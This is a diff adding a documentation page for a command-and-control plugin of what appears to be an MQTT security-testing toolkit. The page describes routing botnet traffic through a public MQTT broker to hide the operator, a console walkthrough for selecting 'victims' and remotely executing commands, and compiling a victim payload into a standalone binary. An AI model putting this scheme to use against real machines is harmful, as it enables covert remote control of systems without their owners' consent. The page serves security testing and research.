@@ -1,0 +1,88 @@
+Command & Control
+=================
+
+MQTT can be used for more than connecting your smart home to the cloud. This plugins harnesses the nature of the
+protocol (publish/subscribe) to create a bot-net like network where the infected clients communicate not to a self
+owned server directly (traditionally), but to a publicly open broker. By that, masquerading the identity of the
+bot-net operator and utilizing the broker to handle the vast amount of clients available.
+
+Architecture
+------------
+
+The architecture of the network is described as follows:
+
+.. code-block:: shell
+
+         subscribe: "input" +------------+   publish: "whoami"
+         +----------------> |            | <-------------------+
+         |                  |            |                     |
+    +----+----+             |   MQTT     |                  +--+------+
+    | Victim  |             |   Broker   |                  | Attacker|
+    +----+----+             |            |                  +--+------+
+         |                  |            |                     |
+         +----------------> |            | <-------------------+
+          publish: "root"   +------------+  subscribe: "output"
+
+
+- The operator connects to a MQTT broker, and starts listening on specific pre-defined topics (:code:`output`).
+- Infected clients, on startup, subscribe to the :code:`input` topics, by that listening for desired commands to be executed when the operator decides so.
+- Then, after execution, the infected clients publish the outputs back to the broker on the :code:`output` topic.
+- The operator, that have subscribed to the :code:`output` topics, now receives the data back and stores is in the database.
+
+
+Operator
+--------
+
+Once we are connected to a broker (using the :code:`connect` command), we automatically start listening to the output topics.
+Then, all we need is to wait for a victim to register (we will be notified if so), or look at the registered clients
+using the :code:`victims` commands:
+
+.. code-block:: text
+
+    localhost:1883 >> victims
+    +----+----------------------------------+--------+-----------+----------------------------+----------------------------+
+    | ID |               UUID               |   OS   |  Hostname |         First Seen         |         Last Seen          |
+    +----+----------------------------------+--------+-----------+----------------------------+----------------------------+
+    | 1  | 8460a5f4bbd0460b9f347d81a44208a0 | darwin |  lab      | 2018-07-20 19:55:21.143132 | 2018-07-20 16:55:25.295223 |
+    +----+----------------------------------+--------+-----------+----------------------------+----------------------------+
+
+We can see we have a single client registered, and from the last seen timestamp, we can observe he was alive recently.
+Now, we can choose it, using again the :code:`victims` command:
+
+.. code-block:: text
+
+    localhost:1883 >> victims -i 1
+    localhost:1883 [Victim #1] >>
+
+When choosing the client, we have registered a global context variable called :code:`Victim`. Now every command executed will
+occur on it. If we want to un-select the victim, simply use the :code:`back victim` command. To execute a command we'll use the `exec` command:
+
+.. code-block:: text
+
+    localhost:1883 [Victim #1] >> exec whoami
+    [!] Executed command (id #3), look at the output table for results.
+
+The execution of commands is asynchronous so they won't block the main thread. We can examine that command output
+using the :code:`commands` directive:
+
+.. code-block:: text
+
+    localhost:1883 [Victim #1] >> commands
+    +----+---------+---------+----------------------------+
+    | ID | Command | Output  |            Time            |
+    +----+---------+---------+----------------------------+
+    | 1  | whoami  | daniel  | 2018-07-23 17:17:05.694352 |
+    +----+---------+---------+----------------------------+
+
+
+We have successfully ran the command on the client and got the output back!
+
+
+Infection
+----------
+
+Once decided which client should be infected, simply compile the library within the :code:`mqtt_pwn_victim/victim.py`
+using bundlers such as `Py2EXE <https://pypi.org/project/py2exe/>`_ or `PyInstaller <https://www.pyinstaller.org/>`_.
+This will create a stand-alone binary to be executed on the client. This section won't discuss directly how to infect
+a client (out of the scope of this material).
+
